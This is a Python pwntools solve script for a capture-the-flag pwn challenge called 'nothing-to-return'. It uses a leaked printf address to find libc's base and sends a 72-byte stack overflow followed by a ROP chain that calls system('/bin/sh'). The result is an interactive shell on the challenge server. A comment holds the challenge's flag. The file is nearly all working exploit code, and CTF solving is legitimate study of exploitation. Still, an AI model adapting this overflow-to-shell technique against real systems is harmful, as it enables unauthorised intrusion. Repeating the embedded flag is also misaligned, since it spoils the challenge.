#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./nothing-to-return_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

REMOTE_NC_CMD    = "nc 34.30.126.104 5000"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.recvuntil(b"is at ")
    leak = int(r.recvline()[:-1], 16)

    libc.address = leak - libc.sym.printf

    rop = ROP(libc)
    POP_RDI = p64(rop.rdi.address)
    RET = p64(0x000000000040101a)

    chain = POP_RDI + p64(libc.binsh()) + RET + p64(libc.sym.system)
    payload = b"A"*72 + chain
    
    r.sendline(bstr(len(payload)))
    r.sendline(payload)

    r.interactive()
    #uoftctf{you_can_always_return}

if __name__ == "__main__":
    main()